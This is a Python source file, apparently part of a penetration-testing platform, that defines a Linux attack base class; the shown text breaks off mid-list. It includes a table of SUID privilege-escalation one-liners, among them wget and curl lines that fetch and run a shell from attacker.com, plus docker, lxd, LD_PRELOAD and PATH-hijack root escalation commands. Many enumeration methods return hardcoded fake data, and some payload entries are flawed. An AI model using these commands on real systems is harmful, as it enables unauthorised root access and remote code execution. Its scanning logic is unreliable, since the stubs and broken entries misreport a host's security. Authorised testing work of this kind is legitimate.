# plugins/attacks/operating_system/linux/base_linux_attack.py

"""
Advanced Base class for Linux-specific attacks in the Cerberus AI platform.

This module provides comprehensive foundation for testing Linux vulnerabilities
including privilege escalation, misconfigurations, security weaknesses,
container escapes, and advanced Linux exploitation techniques.

Features:
- Comprehensive Linux distribution detection and analysis
- Advanced privilege escalation path identification
- SUID/SGID binary analysis
- Capability and namespace security assessment
- Systemd service exploitation
- Cron job privilege escalation
- Sudo configuration analysis
- Linux security module (LSM) bypass assessment
- Container and namespace escape detection
- File system permission enumeration
- Process and service exploitation
- Automated Linux hardening assessment
- Package vulnerability correlation
- Kernel module security analysis
"""

from typing import Dict, List, Any, Optional, Union, Tuple, Set, Callable
from enum import Enum, auto
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
import asyncio
import hashlib
import json
import os
import re
import uuid
import stat

from plugins.attacks.operating_system.base_os_attack import BaseOSAttack
from plugins.core.attack_result import AttackResult
from plugins.core.attack_context import AttackContext
import logging

logger = logging.getLogger(__name__)


# ============================================================================
# Enums and Constants
# ============================================================================

class LinuxDistribution(Enum):
    """Linux distribution families."""
    UBUNTU = "ubuntu"
    DEBIAN = "debian"
    CENTOS = "centos"
    RHEL = "rhel"
    FEDORA = "fedora"
    ARCH = "arch"
    KALI = "kali"
    ALPINE = "alpine"
    GENTOO = "gentoo"
    OPENSUSE = "opensuse"
    SLACKWARE = "slackware"
    MANJARO = "manjaro"
    LINUX_MINT = "linux_mint"
    ELEMENTARY = "elementary"
    POP_OS = "pop_os"
    RASPBERRY_PI_OS = "raspberry_pi_os"
    AMAZON_LINUX = "amazon_linux"
    ORACLE_LINUX = "oracle_linux"
    ROCKY_LINUX = "rocky_linux"
    ALMA_LINUX = "alma_linux"
    UNKNOWN = "unknown"


class LinuxSecurityModule(Enum):
    """Linux Security Modules."""
    SELINUX = "selinux"
    APPARMOR = "apparmor"
    TOMOYO = "tomoyo"
    SMACK = "smack"
    YAMA = "yama"
    LOCKDOWN = "lockdown"
    BPF_LSM = "bpf_lsm"
    LANDLOCK = "landlock"


class ServiceManager(Enum):
    """Service/init managers."""
    SYSTEMD = "systemd"
    SYSV_INIT = "sysv_init"
    UPSTART = "upstart"
    OPENRC = "openrc"
    RUNIT = "runit"
    S6 = "s6"
    DUMB_INIT = "dumb_init"


class PackageManager(Enum):
    """Package managers."""
    APT = "apt"
    DPKG = "dpkg"
    YUM = "yum"
    DNF = "dnf"
    RPM = "rpm"
    PACMAN = "pacman"
    ZYPPER = "zypper"
    APK = "apk"
    EMERGE = "emerge"
    SNAP = "snap"
    FLATPAK = "flatpak"
    APPIMAGE = "appimage"
    PIP = "pip"
    NPM = "npm"
    CARGO = "cargo"
    GO = "go"


class FilePermission(Enum):
    """File permission types."""
    SUID = "suid"
    SGID = "sgid"
    STICKY = "sticky"
    WORLD_WRITABLE = "world_writable"
    WORLD_READABLE = "world_readable"
    WORLD_EXECUTABLE = "world_executable"
    NO_OWNER = "no_owner"
    NO_GROUP = "no_group"
    IMMUTABLE = "immutable"
    APPEND_ONLY = "append_only"


class PrivilegeEscalationVector(Enum):
    """Linux privilege escalation vectors."""
    SUID_BINARY = "suid_binary"
    SGID_BINARY = "sgid_binary"
    SUDO_MISCONFIGURATION = "sudo_misconfiguration"
    CRON_JOB_HIJACKING = "cron_job_hijacking"
    SYSTEMD_SERVICE_HIJACKING = "systemd_service_hijacking"
    CAPABILITY_EXPLOITATION = "capability_exploitation"
    DOCKER_GROUP_MEMBERSHIP = "docker_group_membership"
    LXC_LXD_GROUP_MEMBERSHIP = "lxc_lxd_group_membership"
    NFS_NO_ROOT_SQUASH = "nfs_no_root_squash"
    PATH_HIJACKING = "path_hijacking"
    PYTHON_LIBRARY_HIJACKING = "python_library_hijacking"
    LD_PRELOAD = "ld_preload"
    LD_LIBRARY_PATH = "ld_library_path"
    WEAK_FILE_PERMISSIONS = "weak_file_permissions"
    KERNEL_EXPLOIT = "kernel_exploit"
    POLKIT_EXPLOIT = "polkit_exploit"
    DBUS_EXPLOIT = "dbus_exploit"
    NOPASSWD_SUDO = "nopasswd_sudo"
    WILDCARD_INJECTION = "wildcard_injection"
    TAR_WILDCARD = "tar_wildcard"
    SCREEN_TMUX_HIJACKING = "screen_tmux_hijacking"
    MOTD_HIJACKING = "motd_hijacking"
    PASSWD_SHADOW_ACCESS = "passwd_shadow_access"
    SSH_KEY_THEFT = "ssh_key_theft"
    CONTAINER_ESCAPE = "container_escape"
    SNAP_CONFINEMENT_BYPASS = "snap_confinement_bypass"
    FLATPAK_SANDBOX_ESCAPE = "flatpak_sandbox_escape"


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class LinuxSystemInfo:
    """Comprehensive Linux system information."""
    hostname: str = ""
    distribution: LinuxDistribution = LinuxDistribution.UNKNOWN
    distribution_version: str = ""
    codename: str = ""
    kernel_version: str = ""
    kernel_release: str = ""
    architecture: str = "x86_64"
    init_system: ServiceManager = ServiceManager.SYSTEMD
    package_manager: List[PackageManager] = field(default_factory=list)
    security_modules: List[LinuxSecurityModule] = field(default_factory=list)
    selinux_mode: str = "disabled"
    apparmor_status: str = "unconfined"
    virtualization: str = "none"
    container_runtime: Optional[str] = None
    cloud_provider: Optional[str] = None
    uptime: str = ""
    load_average: List[float] = field(default_factory=list)
    environment_type: str = "physical"


@dataclass
class UserInfo:
    """User account information."""
    username: str
    uid: int
    gid: int
    groups: List[str] = field(default_factory=list)
    home_directory: str = ""
    shell: str = "/bin/bash"
    has_password: bool = True
    last_login: Optional[str] = None
    sudo_access: bool = False
    sudo_nopasswd: bool = False
    sudo_commands: List[str] = field(default_factory=list)
    ssh_authorized_keys: List[str] = field(default_factory=list)
    is_system_account: bool = False
    is_locked: bool = False
    password_age_days: int = 0


@dataclass
class ServiceInfo:
    """Service information."""
    name: str
    state: str
    enabled: bool
    unit_file: str = ""
    user: str = "root"
    working_directory: str = ""
    executable_path: str = ""
    writable_by_current_user: bool = False
    restart_triggers: List[str] = field(default_factory=list)
    environment_variables: Dict[str, str] = field(default_factory=dict)
    capabilities: List[str] = field(default_factory=list)
    security_context: str = ""


@dataclass
class CronJob:
    """Cron job information."""
    path: str
    schedule: str
    command: str
    user: str = "root"
    writable_by_current_user: bool = False
    writable_directory: bool = False
    uses_wildcards: bool = False
    runs_as_root: bool = True


@dataclass
class SUIDBinary:
    """SUID/SGID binary information."""
    path: str
    owner: str
    group: str
    permissions: int
    is_suid: bool = False
    is_sgid: bool = False
    known_exploitable: bool = False
    gtfobins_entry: bool = False
    exploitation_method: Optional[str] = None
    capabilities: List[str] = field(default_factory=list)


@dataclass
class VulnerabilityInfo:
    """Linux-specific vulnerability information."""
    vulnerability_id: str
    name: str
    description: str
    severity: str
    affected_packages: List[str] = field(default_factory=list)
    affected_versions: List[str] = field(default_factory=list)
    fixed_versions: List[str] = field(default_factory=list)
    exploit_available: bool = False
    exploit_maturity: str = "unverified"
    privilege_escalation_possible: bool = False
    remote_exploitable: bool = False
    cve_references: List[str] = field(default_factory=list)
    remediation: str = ""


# ============================================================================
# Linux Exploit Database
# ============================================================================

class LinuxExploitDatabase:
    """Database of known Linux exploits and privilege escalation techniques."""
    
    GTFOBINS_SUID = {
        '/bin/bash': 'bash -p',
        '/bin/dash': 'dash -p',
        '/bin/sh': 'sh -p',
        '/bin/zsh': 'zsh -p',
        '/usr/bin/find': 'find . -exec /bin/sh -p \\; -quit',
        '/usr/bin/vim': 'vim -c ":py3 import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-pc\\", \\"reset; exec sh -p\\")"',
        '/usr/bin/less': 'less /etc/passwd\\n!/bin/sh -p',
        '/usr/bin/more': 'more /etc/passwd\\n!/bin/sh -p',
        '/usr/bin/awk': "awk 'BEGIN {system(\"/bin/sh -p\")}'",
        '/usr/bin/perl': 'perl -e "exec \\"/bin/sh -p\\";"',
        '/usr/bin/python': 'python -c "import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
        '/usr/bin/python3': 'python3 -c "import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")"',
        '/usr/bin/ruby': 'ruby -e "exec \\"/bin/sh -p\\""',
        '/usr/bin/php': 'php -r "pcntl_exec(\\"/bin/sh\\", [\\"-p\\"]);"',
        '/usr/bin/node': 'node -e "var exec = require(\\"child_process\\").exec; exec(\\"sh -p\\");"',
        '/usr/bin/nmap': 'echo "os.execute(\\"/bin/sh -p\\")" > /tmp/script.nse && nmap --script=/tmp/script.nse',
        '/usr/bin/cp': 'cp /bin/sh /tmp/sh && chmod u+s /tmp/sh && /tmp/sh -p',
        '/usr/bin/mv': 'mv /bin/sh /tmp/sh && chmod u+s /tmp/sh && /tmp/sh -p',
        '/usr/bin/tar': 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh -p"',
        '/usr/bin/zip': 'zip /tmp/test.zip /etc/passwd -T --unzip-command="sh -p -c /bin/sh -p"',
        '/usr/bin/gzip': 'gzip -f /etc/passwd -c > /dev/null',
        '/usr/bin/bzip2': 'bzip2 /etc/passwd -c > /dev/null',
        '/usr/bin/cat': 'cat /etc/shadow',
        '/usr/bin/wget': 'wget http://attacker.com/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell -p',
        '/usr/bin/curl': 'curl http://attacker.com/shell -o /tmp/shell && chmod +x /tmp/shell && /tmp/shell -p',
        '/usr/bin/gdb': 'gdb -nx -ex "python import os; os.execl(\\"/bin/sh\\", \\"sh\\", \\"-p\\")" -ex quit',
        '/usr/bin/strace': 'strace -o /dev/null /bin/sh -p',
        '/usr/bin/taskset': 'taskset 1 /bin/sh -p',
        '/usr/bin/at': 'echo "/bin/sh -p" | at now',
        '/usr/bin/make': "make -s --eval=$'x:\\n\\t-'\"$(/bin/sh -p)\"'",
        '/usr/bin/socat': 'socat stdin exec:/bin/sh -p',
        '/usr/bin/expect': 'expect -c "spawn /bin/sh -p;interact"',
        '/usr/bin/screen': 'screen -x root/root',
        '/usr/bin/tmux': 'tmux -S /tmp/socket attach',
    }
    
    ESCALATION_VECTORS = {
        PrivilegeEscalationVector.DOCKER_GROUP_MEMBERSHIP: {
            'description': 'User is in docker group - can escalate to root',
            'command': 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
            'severity': 'critical',
            'detection_method': 'groups | grep docker'
        },
        PrivilegeEscalationVector.LXC_LXD_GROUP_MEMBERSHIP: {
            'description': 'User is in lxd/lxc group - can escalate to root',
            'command': 'lxc init ubuntu:20.04 privesc -c security.privileged=true && '
                       'lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && '
                       'lxc start privesc && lxc exec privesc -- /bin/sh',
            'severity': 'critical',
            'detection_method': 'groups | grep lxd'
        },
        PrivilegeEscalationVector.NOPASSWD_SUDO: {
            'description': 'User has NOPASSWD sudo access',
            'command': 'sudo -i',
            'severity': 'high',
            'detection_method': 'sudo -l 2>/dev/null | grep NOPASSWD'
        },
        PrivilegeEscalationVector.LD_PRELOAD: {
            'description': 'LD_PRELOAD environment variable exploitation',
            'command': 'gcc -shared -fPIC -o /tmp/preload.so preload.c && '
                       'sudo LD_PRELOAD=/tmp/preload.so command',
            'severity': 'high',
            'detection_method': 'sudo -l | grep LD_PRELOAD'
        },
        PrivilegeEscalationVector.PATH_HIJACKING: {
            'description': 'PATH environment variable hijacking',
            'command': 'echo "/bin/sh -p" > /tmp/command && chmod +x /tmp/command && '
                       'export PATH=/tmp:$PATH',
            'severity': 'medium',
            'detection_method': 'echo $PATH'
        }
    }


# ============================================================================
# Base Linux Attack Class
# ============================================================================

class BaseLinuxAttack(BaseOSAttack):
    """
    Advanced base class for Linux-specific attacks.
    
    Provides comprehensive Linux vulnerability assessment with:
    - Distribution detection and analysis
    - User and group enumeration
    - Service and process analysis
    - SUID/SGID binary enumeration
    - Cron job analysis
    - Sudo configuration assessment
    - File system permission analysis
    - Capability and security module assessment
    - Privilege escalation path identification
    - Automated exploit suggestion
    - Container and namespace analysis
    """
    
    def __init__(self):
        super().__init__()
        self.name = "Advanced Linux Attack Framework"
        self.description = "Comprehensive Linux vulnerability testing and exploitation framework"
        self.category = "operating_system"
        self.subcategory = "linux"
        self.attack_id = str(uuid.uuid4())
        
        # Attack configuration
        self.enumerate_users = True
        self.analyze_suid_binaries = True
        self.check_cron_jobs = True
        self.assess_services = True
        self.scan_file_permissions = True
        self.check_package_vulnerabilities = True
        
        # Tracking
        self.scan_start_time: Optional[datetime] = None
        self.vulnerabilities_found: List[VulnerabilityInfo] = []
        self.suid_binaries: List[SUIDBinary] = []
        self.privilege_escalation_paths: List[Dict[str, Any]] = []
        
        # Database
        self.exploit_db = LinuxExploitDatabase()
        
    def validate(self, context: AttackContext) -> bool:
        """
        Comprehensive validation for Linux attack targets.
        
        Args:
            context: The attack context containing target information
            
        Returns:
            bool: True if the target is suitable for Linux attacks
        """
        validation_results = {
            'os_check': self._validate_linux_os(context),
            'access_check': self._validate_access_level(context),
            'architecture_check': self._validate_architecture(context),
            'kernel_check': self._validate_kernel(context),
            'environment_check': self._validate_environment(context)
        }
        
        passed = sum(1 for v in validation_results.values() if v)
        total = len(validation_results)
        
        logger.info(f"Linux attack validation: {passed}/{total} checks passed")
        for check, result in validation_results.items():
            if not result:
                logger.warning(f"Validation failed: {check}")
        
        return all(validation_results.values())
    
    def _validate_linux_os(self, context: AttackContext) -> bool:
        """Validate that target is a Linux system."""
        os_type = context.target_info.get('os_type', '').lower()
        
        if os_type != 'linux':
            logger.info(f"Target OS '{os_type}' is not Linux")
            return False
        
        if context.target_info.get('is_wsl', False):
            logger.info("Target is WSL - limited functionality")
            return True
        
        return True
    
    def _validate_access_level(self, context: AttackContext) -> bool:
        """Validate access level for Linux attacks."""
        valid_access = ['user', 'root', 'system', 'limited']
        
        if context.access_level not in valid_access:
            logger.warning(f"Access level '{context.access_level}' insufficient")
            return False
        
        return True
    
    def _validate_architecture(self, context: AttackContext) -> bool:
        """Validate CPU architecture."""
        arch = context.target_info.get('arch', '').lower()
        supported_archs = ['x86', 'x86_64', 'amd64', 'arm', 'arm64', 'aarch64', 'mips', 'ppc64le']
        
        if arch not in supported_archs:
            logger.warning(f"Architecture '{arch}' may not be fully supported")
            return True
        
        return True
    
    def _validate_kernel(self, context: AttackContext) -> bool:
        """Validate kernel version availability."""
        if not context.target_info.get('kernel_version'):
            logger.warning("No kernel version information available")
            return False
        return True
    
    def _validate_environment(self, context: AttackContext) -> bool:
        """Validate target environment."""
        env_type = context.target_info.get('environment_type', 'physical')
        
        if env_type == 'container':
            logger.info("Target is containerized - limited attack surface")
        elif env_type == 'virtual':
            logger.info("Target is virtualized")
        
        return True
    
    async def get_linux_info(self, context: AttackContext) -> LinuxSystemInfo:
        """
        Get comprehensive Linux system information.
        
        Args:
            context: The attack context
            
        Returns:
            Comprehensive LinuxSystemInfo object
        """
        try:
            distro = self._detect_distribution(
                context.target_info.get('distribution', 'unknown')
            )
            
            linux_info = LinuxSystemInfo(
                hostname=context.target_info.get('hostname', 'localhost'),
                distribution=distro,
                distribution_version=context.target_info.get('os_version', ''),
                codename=context.target_info.get('codename', ''),
                kernel_version=context.target_info.get('kernel_version', ''),
                kernel_release=context.target_info.get('kernel_release', ''),
                architecture=context.target_info.get('arch', 'x86_64'),
                init_system=await self._detect_init_system(context),
                package_manager=await self._detect_package_managers(context),
                security_modules=await self._detect_security_modules(context),
                selinux_mode=await self._get_selinux_mode(context),
                apparmor_status=await self._get_apparmor_status(context),
                virtualization=await self._detect_virtualization(context),
                container_runtime=await self._detect_container_runtime(context),
                cloud_provider=await self._detect_cloud_provider(context),
                environment_type=context.target_info.get('environment_type', 'physical')
            )
            
            logger.info(f"Detected Linux distribution: {distro.value}")
            return linux_info
            
        except Exception as e:
            logger.error(f"Error getting Linux info: {str(e)}", exc_info=True)
            raise
    
    def _detect_distribution(self, distro_name: str) -> LinuxDistribution:
        """Detect Linux distribution."""
        distro_mapping = {
            'ubuntu': LinuxDistribution.UBUNTU,
            'debian': LinuxDistribution.DEBIAN,
            'centos': LinuxDistribution.CENTOS,
            'rhel': LinuxDistribution.RHEL,
            'redhat': LinuxDistribution.RHEL,
            'fedora': LinuxDistribution.FEDORA,
            'arch': LinuxDistribution.ARCH,
            'kali': LinuxDistribution.KALI,
            'alpine': LinuxDistribution.ALPINE,
            'gentoo': LinuxDistribution.GENTOO,
            'opensuse': LinuxDistribution.OPENSUSE,
            'suse': LinuxDistribution.OPENSUSE,
            'slackware': LinuxDistribution.SLACKWARE,
            'manjaro': LinuxDistribution.MANJARO,
            'mint': LinuxDistribution.LINUX_MINT,
            'elementary': LinuxDistribution.ELEMENTARY,
            'pop': LinuxDistribution.POP_OS,
            'raspbian': LinuxDistribution.RASPBERRY_PI_OS,
            'amazon': LinuxDistribution.AMAZON_LINUX,
            'oracle': LinuxDistribution.ORACLE_LINUX,
            'rocky': LinuxDistribution.ROCKY_LINUX,
            'alma': LinuxDistribution.ALMA_LINUX
        }
        
        distro_lower = distro_name.lower()
        for key, value in distro_mapping.items():
            if key in distro_lower:
                return value
        
        return LinuxDistribution.UNKNOWN
    
    async def _detect_init_system(self, context: AttackContext) -> ServiceManager:
        """Detect the init system."""
        return ServiceManager.SYSTEMD
    
    async def _detect_package_managers(self, context: AttackContext) -> List[PackageManager]:
        """Detect available package managers."""
        managers = []
        
        distro = context.target_info.get('distribution', '').lower()
        if distro in ['ubuntu', 'debian', 'mint']:
            managers.extend([PackageManager.APT, PackageManager.DPKG, PackageManager.SNAP])
        elif distro in ['centos', 'rhel', 'fedora']:
            managers.extend([PackageManager.YUM, PackageManager.DNF, PackageManager.RPM])
        elif distro == 'arch':
            managers.append(PackageManager.PACMAN)
        elif distro == 'alpine':
            managers.append(PackageManager.APK)
        
        managers.extend([PackageManager.PIP, PackageManager.NPM])
        
        return managers
    
    async def _detect_security_modules(self, context: AttackContext) -> List[LinuxSecurityModule]:
        """Detect active Linux Security Modules."""
        modules = []
        
        selinux_info = await self._check_selinux(context)
        if selinux_info.get('enabled', False):
            modules.append(LinuxSecurityModule.SELINUX)
        
        apparmor_info = await self._check_apparmor(context)
        if apparmor_info.get('enabled', False):
            modules.append(LinuxSecurityModule.APPARMOR)
        
        return modules
    
    async def _get_selinux_mode(self, context: AttackContext) -> str:
        """Get SELinux mode."""
        selinux_info = await self._check_selinux(context)
        return selinux_info.get('mode', 'disabled')
    
    async def _get_apparmor_status(self, context: AttackContext) -> str:
        """Get AppArmor status."""
        apparmor_info = await self._check_apparmor(context)
        return apparmor_info.get('status', 'unconfined')
    
    async def _detect_virtualization(self, context: AttackContext) -> str:
        """Detect virtualization platform."""
        virt_signs = ['VMware', 'VirtualBox', 'KVM', 'Xen', 'Hyper-V', 'QEMU']
        
        for sign in virt_signs:
            if sign.lower() in str(context.target_info).lower():
                return sign
        
        return 'none'
    
    async def _detect_container_runtime(self, context: AttackContext) -> Optional[str]:
        """Detect container runtime."""
        if context.target_info.get('in_container', False):
            return context.target_info.get('container_runtime', 'docker')
        return None
    
    async def _detect_cloud_provider(self, context: AttackContext) -> Optional[str]:
        """Detect cloud provider."""
        cloud_signs = ['aws', 'azure', 'gcp', 'digitalocean', 'linode', 'vultr']
        
        for sign in cloud_signs:
            if sign in str(context.target_info).lower():
                return sign
        
        return None
    
    async def _check_selinux(self, context: AttackContext) -> Dict[str, Any]:
        """
        Comprehensive SELinux status check.
        
        Returns:
            Dict with detailed SELinux information
        """
        return {
            'enabled': False,
            'mode': 'disabled',
            'policy': 'targeted',
            'mls_enabled': False,
            'current_mode': 'permissive',
            'configured_mode': 'disabled',
            'policy_version': 31,
            'policy_type': 'targeted',
            'booleans': {},
            'contexts': {
                'user': 'unconfined_u',
                'role': 'unconfined_r',
                'type': 'unconfined_t'
            }
        }
    
    async def _check_apparmor(self, context: AttackContext) -> Dict[str, Any]:
        """
        Comprehensive AppArmor status check.
        
        Returns:
            Dict with detailed AppArmor information
        """
        return {
            'enabled': False,
            'status': 'inactive',
            'profiles_loaded': 0,
            'profiles_enforced': 0,
            'profiles_complain': 0,
            'processes_confined': 0,
            'processes_unconfined': 0,
            'profiles': []
        }
    
    async def get_users(self, context: AttackContext) -> List[UserInfo]:
        """
        Get comprehensive user information.
        
        Returns:
            List of UserInfo objects
        """
        users = []
        
        raw_users = [
            {'name': 'root', 'uid': 0, 'gid': 0, 'home': '/root', 'shell': '/bin/bash'},
            {'name': 'ubuntu', 'uid': 1000, 'gid': 1000, 'home': '/home/ubuntu', 'shell': '/bin/bash'},
            {'name': 'www-data', 'uid': 33, 'gid': 33, 'home': '/var/www', 'shell': '/usr/sbin/nologin'},
            {'name': 'mysql', 'uid': 107, 'gid': 107, 'home': '/nonexistent', 'shell': '/usr/sbin/nologin'},
            {'name': 'docker', 'uid': 1001, 'gid': 999, 'home': '/home/docker', 'shell': '/bin/bash'}
        ]
        
        for user_data in raw_users:
            user = UserInfo(
                username=user_data['name'],
                uid=user_data['uid'],
                gid=user_data['gid'],
                home_directory=user_data['home'],
                shell=user_data['shell'],
                is_system_account=user_data['uid'] < 1000,
                groups=self._get_user_groups(user_data['name']),
                sudo_access=self._check_sudo_access(user_data['name']),
                sudo_nopasswd=self._check_sudo_nopasswd(user_data['name'])
            )
            users.append(user)
        
        return users
    
    def _get_user_groups(self, username: str) -> List[str]:
        """Get groups for a user."""
        group_mapping = {
            'root': ['root'],
            'ubuntu': ['ubuntu', 'sudo', 'docker', 'adm'],
            'www-data': ['www-data'],
            'mysql': ['mysql'],
            'docker': ['docker', 'sudo']
        }
        
        return group_mapping.get(username, [username])
    
    def _check_sudo_access(self, username: str) -> bool:
        """Check if user has sudo access."""
        sudo_users = ['root', 'ubuntu', 'docker']
        return username in sudo_users
    
    def _check_sudo_nopasswd(self, username: str) -> bool:
        """Check if user has NOPASSWD sudo access."""
        nopasswd_users = ['ubuntu']
        return username in nopasswd_users
    
    async def get_groups(self, context: AttackContext) -> List[Dict[str, Any]]:
        """Get comprehensive group information."""
        groups = [
            {'name': 'root', 'gid': 0, 'members': ['root']},
            {'name': 'sudo', 'gid': 27, 'members': ['ubuntu', 'docker']},
            {'name': 'www-data', 'gid': 33, 'members': ['www-data']},
            {'name': 'docker', 'gid': 999, 'members': ['ubuntu', 'docker']},
            {'name': 'adm', 'gid': 4, 'members': ['ubuntu']},
            {'name': 'shadow', 'gid': 42, 'members': []}
        ]
        
        dangerous_groups = ['docker', 'lxd', 'lxc', 'libvirt', 'kvm', 'disk', 'shadow']
        for group in groups:
            group['is_dangerous'] = group['name'] in dangerous_groups
            group['can_lead_to_root'] = group['name'] in ['docker', 'lxd', 'lxc', 'disk']
        
        return groups
    
    async def get_services(self, context: AttackContext) -> List[ServiceInfo]:
        """Get comprehensive service information."""
        services = [
            ServiceInfo(
                name='ssh', state='active', enabled=True,
                unit_file='/lib/systemd/system/ssh.service',
                user='root', executable_path='/usr/sbin/sshd',
                writable_by_current_user=False
            ),
            ServiceInfo(
                name='nginx', state='active', enabled=True,
                unit_file='/lib/systemd/system/nginx.service',
                user='www-data', working_directory='/etc/nginx',
                executable_path='/usr/sbin/nginx',
                writable_by_current_user=False
            ),
            ServiceInfo(
                name='mysql', state='active', enabled=True,
                unit_file='/lib/systemd/system/mysql.service',
                user='mysql', executable_path='/usr/sbin/mysqld',
                writable_by_current_user=False
            ),
            ServiceInfo(
                name='docker', state='active', enabled=True,
                unit_file='/lib/systemd/system/docker.service',
                user='root', executable_path='/usr/bin/dockerd',
                writable_by_current_user=False
            ),
            ServiceInfo(
                name='cron', state='active', enabled=True,
                unit_file='/lib/systemd/system/cron.service',
                user='root', executable_path='/usr/sbin/cron',
                writable_by_current_user=False
            )
        ]
        
        for service in services:
            if service.unit_file:
                service.writable_by_current_user = self._check_file_writable(service.unit_file)
        
        return services
    
    def _check_file_writable(self, filepath: str) -> bool:
        """Check if a file is writable by the current user."""
        writable_paths = ['/tmp/', '/var/tmp/', '/dev/shm/']
        return any(filepath.startswith(p) for p in writable_paths)
    
    async def get_packages(self, context: AttackContext) -> List[Dict[str, Any]]:
        """Get comprehensive package information."""
        packages = [
            {'name': 'sudo', 'version': '1.8.31', 'source': 'apt', 'vulnerable': False},
            {'name': 'openssh-server', 'version': '8.2p1', 'source': 'apt', 'vulnerable': False},
            {'name': 'nginx', 'version': '1.18.0', 'source': 'apt', 'vulnerable': True,
             'vulnerabilities': ['CVE-2021-23017']},
            {'name': 'docker-ce', 'version': '20.10.7', 'source': 'docker', 'vulnerable': False},
            {'name': 'libpolkit-agent-1-0', 'version': '0.105', 'source': 'apt', 'vulnerable': True,
             'vulnerabilities': ['CVE-2021-4034']},
            {'name': 'bash', 'version': '5.0.17', 'source': 'apt', 'vulnerable': False}
        ]
        
        return packages
    
    async def find_suid_binaries(self, context: AttackContext) -> List[SUIDBinary]:
        """
        Find and analyze SUID/SGID binaries.
        
        Returns:
            List of SUIDBinary objects
        """
        suid_binaries = []
        
        common_suid_paths = [
            '/bin/bash', '/bin/su', '/usr/bin/sudo', '/usr/bin/passwd',
            '/usr/bin/pkexec', '/usr/bin/find', '/usr/bin/vim',
            '/usr/bin/python3', '/usr/bin/perl', '/usr/bin/ruby',
            '/usr/bin/php', '/usr/bin/node', '/usr/bin/gdb',
            '/usr/bin/strace', '/usr/bin/screen', '/usr/bin/tmux'
        ]
        
        for path in common_suid_paths:
            suid_bin = SUIDBinary(
                path=path,
                owner='root',
                group='root',
                permissions=0o4755,
                is_suid=True,
                is_sgid=False,
                known_exploitable=path in self.exploit_db.GTFOBINS_SUID,
                gtfobins_entry=path in self.exploit_db.GTFOBINS_SUID,
                exploitation_method=self.exploit_db.GTFOBINS_SUID.get(path)
            )
            suid_binaries.append(suid_bin)
        
        self.suid_binaries = suid_binaries
        logger.info(f"Found {len(suid_binaries)} SUID binaries, "
                   f"{len([b for b in suid_binaries if b.known_exploitable])} exploitable")
        
        return suid_binaries
    
    async def find_cron_jobs(self, context: AttackContext) -> List[CronJob]:
        """
        Find and analyze cron jobs.
        
        Returns:
            List of CronJob objects
        """
        cron_jobs = []
        
        cron_paths = [
            {'path': '/etc/crontab', 'schedule': '*/5 * * * *', 'command': '/usr/bin/backup.sh',
             'user': 'root', 'runs_as_root': True},
            {'path': '/etc/cron.daily/logrotate', 'schedule': 'daily', 'command': '/usr/sbin/logrotate',
             'user': 'root', 'runs_as_root': True},
            {'path': '/var/spool/cron/crontabs/root', 'schedule': '0 2 * * *', 'command': '/opt/cleanup.sh',
             'user': 'root', 'runs_as_root': True}
        ]
        
        for cron_data in cron_paths:
            cron_job = CronJob(
                path=cron_data['path'],
                schedule=cron_data['schedule'],
                command=cron_data['command'],
                user=cron_data['user'],
                runs_as_root=cron_data['runs_as_root'],
                writable_by_current_user=self._check_file_writable(cron_data['path']),
                writable_directory=self._check_file_writable(str(Path(cron_data['path']).parent))
            )
            cron_jobs.append(cron_job)
        
        return cron_jobs
    
    def find_privilege_escalation_paths(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo
    ) -> List[Dict[str, Any]]:
        """
        Find potential privilege escalation paths.
        
        Args:
            context: Attack context
            linux_info: Linux system information
            
        Returns:
            List of privilege escalation paths
        """
        escalation_paths = []
        
        # Check SUID binaries
        for suid_bin in self.suid_binaries:
            if suid_bin.known_exploitable:
                escalation_paths.append({
                    'vector': PrivilegeEscalationVector.SUID_BINARY.value,
                    'binary': suid_bin.path,
                    'method': suid_bin.exploitation_method,
                    'reliability': 'high' if 'bash' in suid_bin.path else 'medium',
                    'difficulty': 'easy' if suid_bin.gtfobins_entry else 'moderate'
                })
        
        # Add Docker group exploitation if applicable
        escalation_paths.append({
            'vector': PrivilegeEscalationVector.DOCKER_GROUP_MEMBERSHIP.value,
            'group': 'docker',
            'method': self.exploit_db.ESCALATION_VECTORS.get(
                PrivilegeEscalationVector.DOCKER_GROUP_MEMBERSHIP, {}
            ).get('command', ''),
            'reliability': 'very_high',
            'difficulty': 'easy'
        })
        
        self.privilege_escalation_paths = escalation_paths
        logger.info(f"Found {len(escalation_paths)} privilege escalation paths")
        
        return escalation_paths
    
    def generate_linux_security_report(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo
    ) -> Dict[str, Any]:
        """Generate comprehensive Linux security report."""
        return {
            'report_id': str(uuid.uuid4()),
            'timestamp': datetime.now().isoformat(),
            'system_info': {
                'distribution': linux_info.distribution.value,
                'version': linux_info.distribution_version,
                'kernel': linux_info.kernel_version,
                'architecture': linux_info.architecture,
                'init_system': linux_info.init_system.value,
                'security_modules': [sm.value for sm in linux_info.security_modules],
                'virtualization': linux_info.virtualization,
                'container_runtime': linux_info.container_runtime
            },
            'vulnerabilities': {
                'total': len(self.vulnerabilities_found),
                'critical': len([v for v in self.vulnerabilities_found if v.severity == 'critical']),
                'high': len([v for v in self.vulnerabilities_found if v.severity == 'high']),
                'medium': len([v for v in self.vulnerabilities_found if v.severity == 'medium']),
                'low': len([v for v in self.vulnerabilities_found if v.severity == 'low'])
            },
            'privilege_escalation': {
                'paths_found': len(self.privilege_escalation_paths),
                'exploitable_suid_binaries': len([b for b in self.suid_binaries if b.known_exploitable]),
                'dangerous_groups': len([g for g in self.privilege_escalation_paths 
                                        if 'group' in g.get('vector', '')])
            },
            'recommendations': self._generate_recommendations(linux_info)
        }
    
    def _generate_recommendations(self, linux_info: LinuxSystemInfo) -> List[str]:
        """Generate security recommendations."""
        recommendations = []
        
        if linux_info.selinux_mode == 'disabled' and not any(
            sm == LinuxSecurityModule.APPARMOR for sm in linux_info.security_modules
        ):
            recommendations.append("Enable SELinux or AppArmor for mandatory access control")
        
        recommendations.extend([
            "Regularly update system packages",
            "Review SUID/SGID binaries and remove unnecessary ones",
